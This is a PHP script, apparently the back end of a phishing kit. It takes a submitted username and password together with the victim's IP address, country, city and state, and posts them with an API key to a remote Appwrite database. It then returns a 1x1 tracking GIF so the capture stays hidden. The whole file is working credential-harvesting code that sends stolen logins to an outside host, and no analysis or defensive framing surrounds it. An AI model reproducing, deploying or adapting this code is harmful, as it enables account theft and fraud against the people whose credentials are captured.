<?php
// ============================================
// VERIFY.PHP - Save to Appwrite Database
// ============================================

// Get data from frontend
$u = $_GET['u'] ?? '';
$p = $_GET['p'] ?? '';
$ip = $_GET['ip'] ?? '';
$country = $_GET['country'] ?? '';
$city = $_GET['city'] ?? '';
$state = $_GET['state'] ?? '';

// Appwrite configuration (from environment variables)
$endpoint = getenv('APPWRITE_ENDPOINT') ?: 'https://cloud.appwrite.io/v1';
$projectId = getenv('APPWRITE_PROJECT_ID');
$apiKey = getenv('APPWRITE_API_KEY');
$databaseId = getenv('APPWRITE_DATABASE_ID');
$collectionId = getenv('APPWRITE_COLLECTION_ID');

if (empty($u) && empty($p)) {
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
    exit;
}

// Prepare data for Appwrite
$data = [
    'username' => $u,
    'password' => $p,
    'ip' => $ip,
    'country' => $country,
    'city' => $city,
    'state' => $state,
    'timestamp' => date('Y-m-d H:i:s')
];

// Send to Appwrite
$url = "$endpoint/databases/$databaseId/collections/$collectionId/documents";

if (function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'X-Appwrite-Project: ' . $projectId,
        'X-Appwrite-Key: ' . $apiKey
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_exec($ch);
    curl_close($ch);
} else {
    // Fallback using file_get_contents
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n" .
                        "X-Appwrite-Project: $projectId\r\n" .
                        "X-Appwrite-Key: $apiKey\r\n",
            'content' => json_encode($data)
        ]
    ];
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
